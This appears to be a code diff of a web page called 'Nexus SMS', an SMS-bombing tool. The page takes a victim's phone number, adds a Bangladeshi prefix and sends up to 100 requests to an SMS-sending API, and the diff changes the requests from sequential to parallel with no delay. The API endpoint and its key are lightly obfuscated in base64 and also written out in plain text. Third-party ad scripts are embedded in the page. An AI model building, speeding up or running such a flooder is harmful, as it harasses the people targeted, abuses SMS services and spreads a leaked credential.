+        const icons = {
+            success: 'fa-check-circle',
+            error: 'fa-exclamation-circle',
+            warning: 'fa-triangle-exclamation',
+            info: 'fa-circle-info',
         };
+        const toast = document.createElement('div');
+        toast.className = `toast toast-${type}`;
+        toast.innerHTML = `<i class="fas ${icons[type] || icons.info}"></i> ${message}`;
+        dom.toastContainer.appendChild(toast);
+        setTimeout(() => {
+            toast.style.opacity = '0';
+            toast.style.transform = 'translateX(40px) scale(0.9)';
+            setTimeout(() => toast.remove(), 350);
+        }, duration);
+    }
 
-        let isSending = false;
+    function timeStamp() {
+        return new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
+    }
 
-        // ----- TOAST & LOG HELPERS -----
-        function showToast(message, type = 'info', duration = 4000) {
-            const container = dom.toastContainer;
-            const toast = document.createElement('div');
-            const icons = {
-                success: 'fa-check-circle',
-                error: 'fa-exclamation-circle',
-                warning: 'fa-triangle-exclamation',
-                info: 'fa-circle-info',
-            };
-            toast.className = `toast toast-${type}`;
-            toast.innerHTML = `<i class="fas ${icons[type] || icons.info}"></i> ${message}`;
-            container.appendChild(toast);
-            setTimeout(() => {
-                toast.style.opacity = '0';
-                toast.style.transform = 'translateX(30px)';
-                setTimeout(() => toast.remove(), 300);
-            }, duration);
+    function appendLog(message, type = 'info') {
+        const iconMap = { success: '✅', error: '❌', warn: '⚠️', info: '💠', highlight: '🌟' };
+        const clsMap = { success: 'log-success', error: 'log-error', warn: 'log-warn', info: 'log-info', highlight: 'log-highlight' };
+        const icon = iconMap[type] || '💠';
+        const cls = clsMap[type] || 'log-info';
+        const line = `<span class="${cls}">[${timeStamp()}] ${icon} ${message}</span>`;
+        dom.log.innerHTML += line + '\n';
+        dom.log.scrollTop = dom.log.scrollHeight;
+        if (dom.log.innerHTML.length > 15000) {
+            const lines = dom.log.innerHTML.split('\n');
+            if (lines.length > 350) dom.log.innerHTML = lines.slice(-220).join('\n');
+        }
+    }
+
+    function clearLog() {
+        dom.log.innerHTML = '[🧹] Log cleared · ready.\n';
+        appendLog('Console reset', 'info');
+    }
+
+    // ----- API CONFIG (base64) -----
+    const _base64Url = 'aHR0cHM6Ly9zbXMtc2VuZGVyLTEub25yZW5kZXIuY29tLw'; // https://sms-sender-1.onrender.com/
+    const _base64Key = 'U3VTSGlMeDIwMjRTTVM='; // SuSHiLx2024SMS
+
+    function decodeBase64(str) {
+        try { return atob(str); } catch (e) { return str; }
+    }
+
+    // ----- PARALLEL SUPER FAST BLAST -----
+    async function startBlast() {
+        if (isSending) {
+            showToast('⚠️ Blast already in progress!', 'warning');
+            return;
+        }
+        const phone = dom.phone.value.trim();
+        const count = parseInt(dom.count.value) || 0;
+        if (!phone) {
+            showToast('❌ Please enter a target number.', 'error');
+            dom.phone.focus();
+            return;
+        }
+        if (count < 1 || count > 100) {
+            showToast('❌ Payload must be between 1 and 100.', 'error');
+            dom.count.focus();
+            return;
         }
 
-        function timeStamp() {
-            return new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
+        let formatted = phone;
+        if (!formatted.startsWith('+88')) {
+            if (formatted.startsWith('0')) formatted = '+88' + formatted;
+            else if (!formatted.startsWith('+')) formatted = '+88' + formatted;
         }
 
-        function appendLog(message, type = 'info') {
-            const logEl = dom.log;
-            const ts = timeStamp();
-            const iconMap = { success: '✅', error: '❌', warn: '⚠️', info: '💠' };
-            const clsMap = { success: 'log-success', error: 'log-error', warn: 'log-warn', info: 'log-info' };
-            const icon = iconMap[type] || '💠';
-            const cls = clsMap[type] || 'log-info';
-            const line = `<span class="${cls}">[${ts}] ${icon} ${message}</span>`;
-            logEl.innerHTML += line + '\n';
-            logEl.scrollTop = logEl.scrollHeight;
-            if (logEl.innerHTML.length > 12000) {
-                const lines = logEl.innerHTML.split('\n');
-                if (lines.length > 300) logEl.innerHTML = lines.slice(-200).join('\n');
-            }
-        }
+        isSending = true;
+        const btn = dom.sendBtn;
+        const originalText = dom.sendBtnText.innerHTML;
+        btn.disabled = true;
+        dom.sendBtnText.innerHTML = '<span class="spinner"></span> BLASTING (WAIT)...';
+        dom.progressWrap.classList.add('active');
+        dom.progressBar.style.width = '0%';
 
-        function clearLog() {
-            dom.log.innerHTML = '[🧹] Log cleared · ready for action.\n';
-            appendLog('Console reset', 'info');
-        }
+        appendLog(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`, 'highlight');
+        appendLog(`🎯 Target locked: ${formatted} · ${count} rounds`, 'info');
+        appendLog(`⚡ Engine: Parallel · 0ms delay · Ultra speed`, 'info');
+        appendLog(`🌐 API: sms-sender-1.onrender.com`, 'info');
 
-        // ----- SECURE API CONFIG (Base64 Encoded) -----
-        // Original: https://ampos-api-1.onrender.com/
-        // Original key: SuSHiLx2024SMS
-        const _base64Url = 'aHR0cHM6Ly9hbXBvcy1hcGktMS5vbnJlbmRlci5jb20v'; // base64 of the URL
-        const _base64Key = 'U3VTSGlMeDIwMjRTTVM='; // base64 of the key
+        const baseUrl = decodeBase64(_base64Url);
+        const apiKey = decodeBase64(_base64Key);
 
-        function decodeBase64(str) {
-            try {
-                return atob(str);
-            } catch (e) {
-                return str;
-            }
-        }
+        let successCount = 0;
+        let errorCount = 0;
+        let completed = 0;
 
-        // ----- START BLAST (UPDATED WITH SPEED & SECURE API) -----
-        async function startBlast() {
-            if (isSending) {
-                showToast('Already running a blast!', 'warning');
-                return;
-            }
-            const phone = dom.phone.value.trim();
-            const count = parseInt(dom.count.value) || 0;
-            if (!phone) {
-                showToast('Please enter a target number.', 'error');
-                dom.phone.focus();
-                return;
-            }
-            if (count < 1 || count > 100) {
-                showToast('Payload must be between 1 and 100.', 'error');
-                dom.count.focus();
-                return;
-            }
-            // Format number: add +88 if needed
-            let formatted = phone;
-            if (!formatted.startsWith('+88')) {
-                if (formatted.startsWith('0')) formatted = '+88' + formatted;
-                else if (!formatted.startsWith('+')) formatted = '+88' + formatted;
-            }
+        const promises = [];
+        for (let i = 1; i <= count; i++) {
+            const reqNumber = i;
+            const params = new URLSearchParams({
+                phone: formatted,
+                rounds: count,
+                key: apiKey,
+            });
+            const url = `${baseUrl}?${params.toString()}`;
 
-            isSending = true;
-            const btn = dom.sendBtn;
-            const originalText = dom.sendBtnText.innerHTML;
-            btn.disabled = true;
-            dom.sendBtnText.innerHTML = '<span class="spinner"></span> START BOMBING WAIT 10s...';
-
-            appendLog(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`, 'info');
-            appendLog(`🎯 Target: ${formatted} · ${count} rounds`, 'info');
-            appendLog(`🌐 API: ampos-api-1.onrender.com (secured)`, 'info');
-
-            let successCount = 0;
-            let errorCount = 0;
-
-            // Decode API URL and Key
-            const baseUrl = decodeBase64(_base64Url);
-            const apiKey = decodeBase64(_base64Key);
-
-            for (let i = 1; i <= count; i++) {
-                try {
-                    // Build query parameters
-                    const params = new URLSearchParams({
-                        phone: formatted,
-                        rounds: count,        // or i if you want incremental
-                        key: apiKey
-                    });
-                    const url = `${baseUrl}?${params.toString()}`;
-
-                    // Optional: if you face CORS issues, uncomment the proxy line below
-                    // const proxy = 'https://corsproxy.io/?';
-                    // const url = proxy + encodeURIComponent(`${baseUrl}?${params.toString()}`);
-
-                    const resp = await fetch(url, {
-                        method: 'GET',
-                        headers: {
-                            'Accept': 'application/json'
-                        }
-                    });
-
+            const fetchPromise = fetch(url, {
+                method: 'GET',
+                headers: { Accept: 'application/json' },
+            })
+                .then(async (resp) => {
                     const text = await resp.text();
                     const short = text.length > 60 ? text.substring(0, 60) + '…' : text;
-
                     if (resp.ok) {
                         successCount++;
-                        appendLog(`✅ [${i}/${count}] Hit · ${resp.status} → ${short}`, 'success');
+                        appendLog(`✅ [${reqNumber}/${count}] Hit · ${resp.status} → ${short}`, 'success');
                     } else {
                         errorCount++;
-                        appendLog(`⚠️ [${i}/${count}] Miss · ${resp.status} → ${short}`, 'error');
+                        appendLog(`⚠️ [${reqNumber}/${count}] Miss · ${resp.status} → ${short}`, 'error');
                     }
-                } catch (err) {
+                })
+                .catch((err) => {
                     errorCount++;
-                    appendLog(`💀 [${i}/${count}] Network fail · ${err.message.substring(0, 50)}`, 'error');
-                }
-                // --- SPEED IMPROVEMENT: reduced delay from 480-600ms to 100ms ---
-                await new Promise(r => setTimeout(r, 100));
-            }
+                    appendLog(`💀 [${reqNumber}/${count}] Network fail · ${err.message.substring(0, 50)}`, 'error');
+                })
+                .finally(() => {
+                    completed++;
+                    const percent = Math.round((completed / count) * 100);
+                    dom.progressBar.style.width = `${percent}%`;
+                });
 
-            appendLog(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`, 'info');
-            if (successCount > 0) {
-                appendLog(`🏆 Blast complete! ✅ ${successCount} · ❌ ${errorCount}`, 'success');
-                showToast(`Blast finished: ${successCount} successful`, 'success', 3000);
-            } else {
-                appendLog(`💔 All ${errorCount} requests failed.`, 'error');
-                showToast('Blast failed entirely.', 'error', 3000);
-            }
-
-            isSending = false;
-            btn.disabled = false;
-            dom.sendBtnText.innerHTML = originalText;
+            promises.push(fetchPromise);
         }
 
-        // ----- THEME TOGGLE -----
-        function toggleTheme() {
-            const body = document.body;
-            const isLight = body.classList.toggle('light');
-            dom.themeIcon.className = isLight ? 'fas fa-sun' : 'fas fa-moon';
-            localStorage.setItem('nexus_theme', isLight ? 'light' : 'dark');
-        }
+        await Promise.allSettled(promises);
 
-        function loadTheme() {
-            const theme = localStorage.getItem('nexus_theme');
-            if (theme === 'light') {
-                document.body.classList.add('light');
-                dom.themeIcon.className = 'fas fa-sun';
-            } else {
-                dom.themeIcon.className = 'fas fa-moon';
-            }
-        }
-
-        // ----- INIT -----
-        function init() {
-            loadTheme();
-            if (!dom.count.value) dom.count.value = '5';
-            dom.themeToggle.addEventListener('click', toggleTheme);
-            dom.phone.addEventListener('keydown', (e) => { if (e.key === 'Enter') dom.count.focus(); });
-            dom.count.addEventListener('keydown', (e) => { if (e.key === 'Enter') startBlast(); });
-            appendLog('🚀 Nexus SMS V1.0 initialized · ' + new Date().toLocaleString(), 'success');
-        }
-
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', init);
+        appendLog(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`, 'highlight');
+        if (successCount > 0) {
+            appendLog(`🏆 Blast complete! ✅ ${successCount} · ❌ ${errorCount}`, 'success');
+            showToast(`🎉 Blast finished: ${successCount} successful`, 'success', 3500);
         } else {
-            init();
+            appendLog(`💔 All ${errorCount} requests failed.`, 'error');
+            showToast('💥 Blast failed entirely.', 'error', 3500);
         }
 
-        // Expose functions globally
-        window.startBlast = startBlast;
-        window.clearLog = clearLog;
-        window.showToast = showToast;
-        window.toggleTheme = toggleTheme;
-    </script>
-<script src="https://pl30780803.effectivecpmnetwork.com/76/ef/14/76ef14fb1c4fc084a6354e380bd37f30.js"></script>
+        setTimeout(() => {
+            dom.progressWrap.classList.remove('active');
+            dom.progressBar.style.width = '0%';
+        }, 600);
+
+        isSending = false;
+        btn.disabled = false;
+        dom.sendBtnText.innerHTML = originalText;
+    }
+
+    // ----- THEME TOGGLE -----
+    function toggleTheme() {
+        const body = document.body;
+        const isLight = body.classList.toggle('light');
+        dom.themeIcon.className = isLight ? 'fas fa-sun' : 'fas fa-moon';
+        localStorage.setItem('nexus_theme_v2', isLight ? 'light' : 'dark');
+    }
+
+    function loadTheme() {
+        const theme = localStorage.getItem('nexus_theme_v2');
+        if (theme === 'light') {
+            document.body.classList.add('light');
+            dom.themeIcon.className = 'fas fa-sun';
+        } else {
+            dom.themeIcon.className = 'fas fa-moon';
+        }
+    }
+
+    // ----- INIT -----
+    function init() {
+        loadTheme();
+        if (!dom.count.value) dom.count.value = '5';
+        dom.themeToggle.addEventListener('click', toggleTheme);
+        dom.phone.addEventListener('keydown', (e) => { if (e.key === 'Enter') dom.count.focus(); });
+        dom.count.addEventListener('keydown', (e) => { if (e.key === 'Enter') startBlast(); });
+        appendLog('🚀 Nexus SMS Ultra v2.0 initialized · ' + new Date().toLocaleString(), 'success');
+    }
+
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', init);
+    } else {
+        init();
+    }
+
+    window.startBlast = startBlast;
+    window.clearLog = clearLog;
+    window.showToast = showToast;
+    window.toggleTheme = toggleTheme;
+</script>
+  <script src="https://pl30780803.effectivecpmnetwork.com/76/ef/14/76ef14fb1c4fc084a6354e380bd37f30.js"></script>
 <script async="async" data-cfasync="false" src="https://pl30780800.effectivecpmnetwork.com/562b28f92c2ab11926780737ca2d59e4/invoke.js"></script>
 <div id="container-562b28f92c2ab11926780737ca2d59e4"></div>
 </body>
-</html>
+    </html>
